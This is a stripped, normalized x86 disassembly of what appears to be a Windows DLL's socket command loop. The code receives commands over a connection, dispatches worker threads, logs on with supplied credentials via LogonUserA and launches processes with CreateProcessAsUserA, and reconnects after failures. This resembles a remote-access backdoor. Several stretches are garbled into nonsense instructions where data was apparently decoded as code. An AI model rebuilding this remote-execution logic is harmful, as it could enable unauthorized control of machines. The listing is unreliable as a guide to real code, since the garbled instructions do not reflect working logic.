call sub_710042bf
add [ edi + rw-data ] bh
mov ecx [ ebp - 0x23f0 ]
add ecx 0x1
mov [ ebp - 0x2658 ] ecx
jmp r-xdata
mov edx [ ebp - 0x2654 ]
add edx [ ebp - 0x23f0 ]
movsx eax [ edx ]
cmp eax 0x2d
je r-xdata
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
push rw-data
call sub_71001f60
add esp 0xc
mov [ rw-data ] eax
mov ecx [ rw-data ]
push ecx
push rw-data
mov edx [ rw-data ]
push edx
call sub_71007550
add esp 0xc
cmp eax 0x1
jge r-xdata
jmp r-xdata
push 0x0
mov eax [ rw-data ]
push eax
call shutdown
mov ecx [ rw-data ]
push ecx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
jmp r-xdata
mov ecx 0x3
mov edi rw-data
mov esi rw-data
xor eax eax
[ esi ] [ edi ]
jne r-xdata
call 0x7103f813
add [ eax ] al
mov [ ebp - 0x26b8 ] 0x0
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
inc ecx
push ecx
call [ malloc@IAT ]
add esp 0x4
mov [ ebp - 0x26b8 ] eax
cmp [ ebp - 0x26b8 ] 0x0
je r-xdata
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
push rw-data
call sub_71001f60
add esp 0xc
mov [ rw-data ] eax
mov ecx [ rw-data ]
push ecx
push rw-data
mov edx [ rw-data ]
push edx
call sub_71007550
add esp 0xc
cmp eax 0x1
jge r-xdata
mov edi [ ebp - 0x2654 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
cmp [ ebp - 0x2658 ] ecx
jge r-xdata
jmp r-xdata
mov ecx [ ebp - 0x2650 ]
add ecx [ ebp - 0x23f0 ]
mov edx [ ebp - 0x2654 ]
add edx [ ebp - 0x23f0 ]
mov al [ edx ]
mov [ ecx ] al
jmp r-xdata
jmp r-xdata
push 0x0
mov eax [ rw-data ]
push eax
call shutdown
mov ecx [ rw-data ]
push ecx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
jmp r-xdata
jle r-xdata
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
push rw-data
call sub_71001f60
add esp 0xc
mov [ rw-data ] eax
mov ecx [ rw-data ]
push ecx
push rw-data
mov edx [ rw-data ]
push edx
call sub_71007550
add esp 0xc
cmp eax 0x1
jge r-xdata
jmp r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
inc ecx
xor eax eax
mov edi [ ebp - 0x26b8 ]
mov edx ecx
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xfffffff7
push ecx
push rw-data
mov eax [ ebp - 0x26b8 ]
push eax
call [ strncpy@IAT ]
add esp 0xc
cmp [ ebp - 0x3e8 ] 0x1
jne r-xdata
jmp r-xdata
push 0x0
mov eax [ rw-data ]
push eax
call shutdown
mov ecx [ rw-data ]
push ecx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
jmp r-xdata
mov ecx [ ebp - 0x2658 ]
add ecx 0x1
mov [ ebp - 0x265c ] ecx
jmp r-xdata
mov eax [ ebp - 0x2654 ]
add eax [ ebp - 0x2658 ]
movsx ecx [ eax ]
cmp ecx 0x2d
je r-xdata
jmp r-xdata
mov ecx 0x2
mov edi rw-data
jg r-xdata
lea edx [ ebp - 0x250c ]
push edx
push 0x0
push rw-data
push r-xdata
push 0x0
push 0x0
call [ CreateThread@IAT ]
push 0x64
call [ Sleep@IAT ]
jmp r-xdata
push 0x0
mov eax [ rw-data ]
push eax
call shutdown
mov ecx [ rw-data ]
push ecx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
jmp r-xdata
mov eax [ ebp - 0x26b8 ]
push eax
call sub_71005420
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov edi rw-data
mov edx [ ebp - 0x26b8 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
add edi 0xffffffff
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
mov edi [ ebp - 0x2654 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
cmp [ ebp - 0x265c ] ecx
jge r-xdata
jmp r-xdata
mov edx [ ebp - 0x2658 ]
sub edx [ ebp - 0x23f0 ]
mov eax [ ebp - 0x2654 ]
add eax [ ebp - 0x2658 ]
mov ecx [ ebp - 0x26b0 ]
mov al [ eax ]
mov [ ecx + edx - 0x1 ] al
jmp r-xdata
mov ecx [ ebp - 0x23f0 ]
add ecx 0x1
mov [ ebp - 0x23f0 ] ecx
lea eax [ ebp - 0x250c ]
push eax
push 0x0
push rw-data
push sub_71005450
push 0x0
push 0x0
call [ CreateThread@IAT ]
push 0x64
call [ Sleep@IAT ]
jmp r-xdata
mov ecx 0x3
mov edi rw-data
mov esi rw-data
xor edx edx
[ esi ] [ edi ]
jne r-xdata
mov esi rw-data
xor eax eax
[ esi ] [ edi ]
je r-xdata
call sub_710041ce
add [ edi + rw-data ] bh
mov edx rw-data
mov eax [ ebp - 0x26b8 ]
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
push rw-data
call sub_71001f60
add esp 0xc
mov [ rw-data ] eax
mov ecx [ rw-data ]
push ecx
push rw-data
mov edx [ rw-data ]
push edx
call sub_71007550
add esp 0xc
cmp eax 0x1
jge r-xdata
mov ecx [ ebp - 0x265c ]
add ecx 0x1
mov [ ebp - 0x26a4 ] ecx
jmp r-xdata
mov eax [ ebp - 0x2654 ]
add eax [ ebp - 0x265c ]
movsx ecx [ eax ]
cmp ecx 0x2d
je r-xdata
jmp r-xdata
mov ecx 0xb
mov edi rw-data
mov esi rw-data
xor edx edx
[ esi ] [ edi ]
jne r-xdata
mov edx [ ebp - 0x26b8 ]
push edx
call [ free@IAT ]
add esp 0x4
mov [ ebp - 0x26b8 ] 0x0
mov [ rw-data ] 0x0
push 0x0
mov edx [ ebp - 0x28 ]
push edx
call [ TerminateThread@IAT ]
mov [ ebp - 0x28 ] 0x0
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
push rw-data
call sub_71001f60
add esp 0xc
mov [ rw-data ] eax
mov ecx [ rw-data ]
push ecx
push rw-data
mov edx [ rw-data ]
push edx
call sub_71007550
add esp 0xc
cmp eax 0x1
jge r-xdata
push 0x0
mov eax [ rw-data ]
push eax
call shutdown
mov ecx [ rw-data ]
push ecx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
jmp r-xdata
mov edi [ ebp - 0x2654 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
cmp [ ebp - 0x26a4 ] ecx
jge r-xdata
jmp r-xdata
mov edx [ ebp - 0x265c ]
sub edx [ ebp - 0x2658 ]
mov eax [ ebp - 0x2654 ]
add eax [ ebp - 0x265c ]
mov ecx [ ebp - 0x26a8 ]
mov al [ eax ]
mov [ ecx + edx - 0x1 ] al
jmp r-xdata
mov edx [ ebp - 0x2658 ]
add edx 0x1
mov [ ebp - 0x2658 ] edx
mov ecx 0x5
mov edi rw-data
mov esi rw-data
xor eax eax
[ esi ] [ edi ]
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
push 0x0
mov eax [ rw-data ]
push eax
call shutdown
mov ecx [ rw-data ]
push ecx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
jmp r-xdata
mov edx rw-data
mov eax [ ebp - 0x26a8 ]
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
mov eax [ ebp - 0x26a4 ]
sub eax [ ebp - 0x265c ]
mov ecx [ ebp - 0x2654 ]
add ecx [ ebp - 0x26a4 ]
mov edx [ ebp - 0x264c ]
mov cl [ ecx ]
mov [ edx + eax - 0x1 ] cl
jmp r-xdata
jmp r-xdata
mov ecx 0x4
mov edi rw-data
mov esi rw-data
xor edx edx
[ esi ] [ edi ]
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
mov ecx rw-data
mov edx [ ebp - 0x26b0 ]
mov eax [ edx ]
cmp eax [ ecx ]
jne r-xdata
xor edx edx
mov eax [ ebp - 0x26a8 ]
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] edx
mov [ eax + 0x10 ] edx
mov edx [ ebp - 0x26a4 ]
add edx 0x1
mov [ ebp - 0x26a4 ] edx
mov edx [ ebp - 0x265c ]
add edx 0x1
mov [ ebp - 0x265c ] edx
mov ecx 0x17
mov edi rw-data
mov esi rw-data
xor edx edx
[ esi ] [ edi ]
jne r-xdata
mov [ ebp - 0x26bc ] 0x0
xor eax eax
mov [ ebp - 0x26d0 ] eax
mov [ ebp - 0x26cc ] eax
mov [ ebp - 0x26c8 ] eax
mov [ ebp - 0x26c4 ] eax
mov [ ebp - 0x26c0 ] eax
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffe9
mov esi rw-data
lea edi [ ebp - 0x26d0 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea eax [ ebp - 0x26d0 ]
push eax
call [ _atoi64@IAT ]
add esp 0x4
mov [ rw-data ] eax
mov [ rw-data ] edx
lea eax [ ebp - 0x26b4 ]
push eax
push 0x0
push 0x2
mov ecx [ ebp - 0x26b0 ]
push ecx
mov edx [ ebp - 0x26a8 ]
push edx
mov eax [ ebp - 0x2650 ]
push eax
call [ LogonUserA@IAT ]
mov [ ebp - 0x26ac ] eax
mov ecx [ ebp - 0x2650 ]
push ecx
call [ free@IAT ]
add esp 0x4
mov edx [ ebp - 0x26b0 ]
push edx
call [ free@IAT ]
add esp 0x4
mov eax [ ebp - 0x26a8 ]
push eax
call [ free@IAT ]
add esp 0x4
mov ecx [ ebp - 0x2654 ]
push ecx
call [ free@IAT ]
add esp 0x4
mov [ ebp - 0x2650 ] 0x0
mov [ ebp - 0x26b0 ] 0x0
mov [ ebp - 0x26a8 ] 0x0
mov [ ebp - 0x2654 ] 0x0
cmp [ ebp - 0x26ac ] 0x0
jne r-xdata
xor ecx ecx
mov edx [ ebp - 0x26b0 ]
mov [ edx ] ecx
mov [ edx + 0x4 ] ecx
mov [ edx + 0x8 ] ecx
mov [ edx + 0xc ] ecx
mov [ edx + 0x10 ] ecx
mov ecx 0x5
mov edi rw-data
mov esi rw-data
xor eax eax
[ esi ] [ edi ]
jne r-xdata
mov [ rw-data ] 0xffffffff
mov [ rw-data ] 0xffffffff
mov [ rw-data ] 0xffffffff
mov [ rw-data ] 0xffffffff
lea edx [ ebp - 0x2648 ]
push edx
lea eax [ ebp - 0x26a0 ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov ecx [ ebp - 0x264c ]
push ecx
push 0x0
mov edx [ ebp - 0x26b4 ]
push edx
call [ CreateProcessAsUserA@IAT ]
test eax eax
jne r-xdata
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
push rw-data
call sub_71001f60
add esp 0xc
mov [ rw-data ] eax
mov ecx [ rw-data ]
push ecx
push rw-data
mov edx [ rw-data ]
push edx
call sub_71007550
add esp 0xc
cmp eax 0x1
jge r-xdata
mov ecx 0x3
mov edi rw-data
mov esi rw-data
xor edx edx
[ esi ] [ edi ]
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ ebp - 0x26d4 ] 0x0
xor ecx ecx
mov [ ebp - 0x26e8 ] ecx
mov [ ebp - 0x26e4 ] ecx
mov [ ebp - 0x26e0 ] ecx
mov [ ebp - 0x26dc ] ecx
mov [ ebp - 0x26d8 ] ecx
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffe5
mov esi rw-data
lea edi [ ebp - 0x26e8 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea eax [ ebp - 0x26e8 ]
push eax
call [ _atoi64@IAT ]
add esp 0x4
mov [ rw-data ] eax
mov [ rw-data ] edx
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
push rw-data
call sub_71001f60
add esp 0xc
mov [ rw-data ] eax
mov ecx [ rw-data ]
push ecx
push rw-data
mov edx [ rw-data ]
push edx
call sub_71007550
add esp 0xc
cmp eax 0x1
jge r-xdata
jmp r-xdata
push 0x0
mov eax [ rw-data ]
push eax
call shutdown
mov ecx [ rw-data ]
push ecx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
jmp r-xdata
je r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
push 0x0
mov eax [ rw-data ]
push eax
call shutdown
mov ecx [ rw-data ]
push ecx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
jmp r-xdata
nop
nop
nop
mov ecx 0x5
mov edi rw-data
mov esi rw-data
xor eax eax
[ esi ] [ edi ]
jne r-xdata
jne r-xdata
mov edx rw-data
mov eax rw-data
mov cx [ eax ]
cmp cx [ edx ]
jne r-xdata
lea ecx [ ebp - 0x250c ]
push ecx
push 0x0
push rw-data
push sub_71007010
push 0x0
push 0x0
call [ CreateThread@IAT ]
push 0x64
call [ Sleep@IAT ]
jmp r-xdata
jmp r-xdata
nop
clc
jae r-xdata
lea edx [ ebp - 0x250c ]
push edx
push 0x0
push rw-data
push sub_71005e80
push 0x0
push 0x0
call [ CreateThread@IAT ]
push 0x64
call [ Sleep@IAT ]
jmp r-xdata
jne r-xdata
mov eax rw-data
mov ecx rw-data
mov dx [ ecx ]
cmp dx [ eax ]
jne r-xdata
call 0x15d0fa4f
add [ ecx - 0x47 ] dh
insb
das
add [ ecx + 0x66 ] esi
mov edx [ ecx ]
mov ecx 0x3
mov edi rw-data
mov esi rw-data
xor edx edx
[ esi ] [ edi ]
jne r-xdata
lea eax [ ebp - 0x250c ]
push eax
push 0x0
push rw-data
push r-xdata
push 0x0
push 0x0
call [ CreateThread@IAT ]
push 0x64
call [ Sleep@IAT ]
jmp r-xdata
je r-xdata
call sub_710010c0
mov edi eax
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
push rw-data
call sub_71001f60
add esp 0xc
mov [ rw-data ] eax
mov ecx [ rw-data ]
push ecx
push rw-data
mov edx [ rw-data ]
push edx
call sub_71007550
add esp 0xc
cmp eax 0x1
jge r-xdata
mov ecx 0x3
jne r-xdata
jmp r-xdata
push 0x0
mov eax [ rw-data ]
push eax
call shutdown
mov ecx [ rw-data ]
push ecx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
jmp r-xdata
clc
jae r-xdata
lea ecx [ ebp - 0x46f4 ]
call sub_710017f0
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x46f4 ]
call sub_71001a80
mov ecx 0x800
xor eax eax
mov edi rw-data
[ edi ]
lea ecx [ ebp - 0x46f4 ]
call sub_71001890
mov edi eax
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
push rw-data
call sub_71001f60
add esp 0xc
mov [ rw-data ] eax
mov ecx 0x800
xor eax eax
lea edi [ ebp - 0x46e8 ]
[ edi ]
mov ecx [ rw-data ]
mov esi rw-data
lea edi [ ebp - 0x46e8 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ rw-data ]
mov [ ebp - 0x46ec ] eax
mov ecx 0x800
xor eax eax
mov edi rw-data
[ edi ]
mov ecx [ rw-data ]
push ecx
push rw-data
push rw-data
call [ sprintf@IAT ]
add esp 0xc
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
push rw-data
call sub_71001f60
add esp 0xc
mov [ rw-data ] eax
push 0x0
mov edx [ rw-data ]
push edx
push rw-data
mov eax [ rw-data ]
push eax
call send
cmp eax 0x1
jge r-xdata
mov edi rw-data
mov esi rw-data
xor edx edx
[ esi ] [ edi ]
jne r-xdata
0x3b9e8 0x0
mov ecx 0x3
mov edi rw-data
mov esi rw-data
xor edx edx
[ esi ] [ edi ]
jne r-xdata
call 0x7103ff35
add [ eax ] al
mov ecx 0x800
xor eax eax
mov edi rw-data
[ edi ]
push 0x0
push 0x2000
push rw-data
mov eax [ rw-data ]
push eax
call recv
mov [ rw-data ] eax
cmp [ rw-data ] 0x1
jge r-xdata
push 0x0
mov ecx [ rw-data ]
push ecx
call shutdown
mov edx [ rw-data ]
push edx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x46f4 ]
call sub_71001800
jmp r-xdata
mov ecx 0x3
mov edi rw-data
mov esi rw-data
xor edx edx
[ esi ] [ edi ]
jne r-xdata
mov ecx 0x80
xor eax eax
lea edi [ ebp - 0x228 ]
[ edi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xfffffffb
mov esi rw-data
lea edi [ ebp - 0x228 ]
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
cmp [ ebp - 0x3e8 ] 0x1
jne r-xdata
mov eax [ rw-data ]
push eax
push rw-data
call sub_71001fe0
add esp 0x8
mov ecx 0x5
mov edi rw-data
mov esi rw-data
xor edx edx
[ esi ] [ edi ]
jne r-xdata
push 0x0
mov ecx [ rw-data ]
push ecx
call shutdown
mov edx [ rw-data ]
push edx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x46f4 ]
call sub_71001800
jmp r-xdata
je r-xdata
mov [ ebp - 0x4708 ] 0x0
cmp [ ebp - 0x2504 ] 0x0
je r-xdata
jmp r-xdata
lea ecx [ ebp - 0x4700 ]
call sub_710017f0
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x4700 ]
call sub_71001a80
lea ecx [ ebp - 0x228 ]
push ecx
call [ atoi@IAT ]
add esp 0x4
mov [ ebp - 0x46f8 ] eax
cmp [ ebp - 0x46f8 ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x46f4 ]
call sub_71001800
jmp r-xdata
mov eax [ ebp - 0x46ec ]
push eax
lea ecx [ ebp - 0x46e8 ]
push ecx
mov edx [ rw-data ]
push edx
call sub_71007550
add esp 0xc
cmp eax 0x1
jge r-xdata
mov eax rw-data
mov ecx rw-data
mov dx [ ecx ]
cmp dx [ eax ]
jne r-xdata
jne r-xdata
lea edx [ ebp - 0x250c ]
push edx
push 0x0
push rw-data
push sub_71004bd0
push 0x0
push 0x0
call [ CreateThread@IAT ]
mov [ ebp - 0x2504 ] eax
push 0x64
call [ Sleep@IAT ]
jmp r-xdata
lea eax [ ebp - 0x4708 ]
push eax
mov ecx [ ebp - 0x2504 ]
push ecx
call [ GetExitCodeThread@IAT ]
mov [ ebp - 0x4704 ] eax
cmp [ ebp - 0x4704 ] 0x0
je r-xdata
mov eax [ ebp - 0x46f8 ]
push eax
lea ecx [ ebp - 0x4700 ]
call sub_71001cb0
mov edi eax
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
add edi 0xffffffff
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
lea edx [ ebp - 0x228 ]
push edx
lea ecx [ ebp - 0x4700 ]
call sub_71001de0
mov edi eax
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
add edi 0xffffffff
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
push 0x0
mov eax [ rw-data ]
push eax
call shutdown
mov ecx [ rw-data ]
push ecx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x46f4 ]
call sub_71001800
jmp r-xdata
je r-xdata
mov [ ebp - 0x4710 ] 0x0
cmp [ ebp - 0x23ec ] 0x0
je r-xdata
jmp r-xdata
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
push rw-data
call sub_71001f60
add esp 0xc
mov [ rw-data ] eax
mov ecx [ rw-data ]
push ecx
push rw-data
mov edx [ rw-data ]
push edx
call sub_71007550
add esp 0xc
cmp eax 0x1
jge r-xdata
cmp [ ebp - 0x4708 ] 0x103
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
push rw-data
call sub_71001f60
add esp 0xc
mov [ rw-data ] eax
mov ecx [ rw-data ]
push ecx
push rw-data
mov edx [ rw-data ]
push edx
call sub_71007550
add esp 0xc
cmp eax 0x1
jge r-xdata
mov [ ebp - 0x28 ] 0x0
mov ecx 0x13
mov edi rw-data
mov esi rw-data
xor eax eax
[ esi ] [ edi ]
jne r-xdata
mov ecx 0x5
mov edi rw-data
jne r-xdata
lea edx [ ebp - 0x250c ]
push edx
push 0x0
push rw-data
push sub_710064d0
push 0x0
push 0x0
call [ CreateThread@IAT ]
mov [ ebp - 0x23ec ] eax
push 0x64
call [ Sleep@IAT ]
jmp r-xdata
lea eax [ ebp - 0x4710 ]
push eax
mov ecx [ ebp - 0x23ec ]
push ecx
call [ GetExitCodeThread@IAT ]
mov [ ebp - 0x470c ] eax
cmp [ ebp - 0x470c ] 0x0
je r-xdata
int3
jmp r-xdata
push 0x0
mov eax [ rw-data ]
push eax
call shutdown
mov ecx [ rw-data ]
push ecx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
jmp r-xdata
mov edx [ ebp - 0x2504 ]
push edx
call [ CloseHandle@IAT ]
mov [ ebp - 0x2504 ] 0x0
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x4700 ]
call sub_71001800
push 0x0
mov eax [ rw-data ]
push eax
call shutdown
mov ecx [ rw-data ]
push ecx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x4700 ]
call sub_71001800
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x4718 ] 0x0
cmp [ ebp - 0x2500 ] 0x0
je r-xdata
mov esi rw-data
xor eax eax
[ esi ] [ edi ]
jne r-xdata
call sub_71004f8a
add [ edi + rw-data ] bh
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
push rw-data
call sub_71001f60
add esp 0xc
mov [ rw-data ] eax
mov ecx [ rw-data ]
push ecx
push rw-data
mov edx [ rw-data ]
push edx
call sub_71007550
add esp 0xc
cmp eax 0x1
jge r-xdata
cmp [ ebp - 0x4710 ] 0x103
je r-xdata
lea edx [ ebp - 0x250c ]
push edx
push 0x0
push rw-data
push sub_71006ae0
push 0x0
push 0x0
call [ CreateThread@IAT ]
mov [ ebp - 0x2500 ] eax
push 0x64
call [ Sleep@IAT ]
jmp r-xdata
lea ecx [ ebp - 0x4718 ]
push ecx
mov edx [ ebp - 0x2500 ]
push edx
call [ GetExitCodeThread@IAT ]
mov [ ebp - 0x4714 ] eax
cmp [ ebp - 0x4714 ] 0x0
je r-xdata
jmp r-xdata
push 0x0
mov eax [ rw-data ]
push eax
call shutdown
mov ecx [ rw-data ]
push ecx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
jmp r-xdata
mov edx [ ebp - 0x23ec ]
push edx
call [ CloseHandle@IAT ]
mov [ ebp - 0x23ec ] 0x0
jmp r-xdata
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
push rw-data
call sub_71001f60
add esp 0xc
mov [ rw-data ] eax
mov ecx [ rw-data ]
push ecx
push rw-data
mov edx [ rw-data ]
push edx
call sub_71007550
add esp 0xc
cmp eax 0x1
jge r-xdata
cmp [ ebp - 0x4718 ] 0x103
je r-xdata
jmp r-xdata
push 0x0
mov eax [ rw-data ]
push eax
call shutdown
mov ecx [ rw-data ]
push ecx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
jmp r-xdata
mov eax [ ebp - 0x2500 ]
push eax
call [ CloseHandle@IAT ]
mov [ ebp - 0x2500 ] 0x0
jmp r-xdata
sub_710041ce
insb
das
add [ ecx + 0x68 ] esi
loopne r-xdata
jno r-xdata
add [ ecx + 0x6a ] dh
add [ edx ] ch
add [ ecx + 0x66 ] esi
mov edx [ ecx ]
leave
push [ ebx ]
shl dl 0xae
mov ecx 0x800
xor eax eax
mov edi rw-data
[ edi ]
push 0x0
push 0x2000
push rw-data
mov eax [ rw-data ]
push eax
call recv
mov [ rw-data ] eax
cmp [ rw-data ] 0x1
jge r-xdata
mov ecx 0x3
mov edi rw-data
mov esi rw-data
xor edx edx
[ esi ] [ edi ]
jne r-xdata
call [ CreateThread@IAT ]
push 0x64
call [ Sleep@IAT ]
jmp r-xdata
lea eax [ ebp - 0x250c ]
push eax
push 0x0
push rw-data
push r-xdata
push 0x0
push 0x0
jmp r-xdata
push 0x0
mov eax [ rw-data ]
push eax
call shutdown
mov ecx [ rw-data ]
push ecx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
jmp r-xdata
mov eax [ rw-data ]
push eax
push rw-data
call sub_71001fe0
add esp 0x8
mov ecx 0x800
xor eax eax
mov edi rw-data
[ edi ]
mov ecx 0x800
xor eax eax
mov edi rw-data
[ edi ]
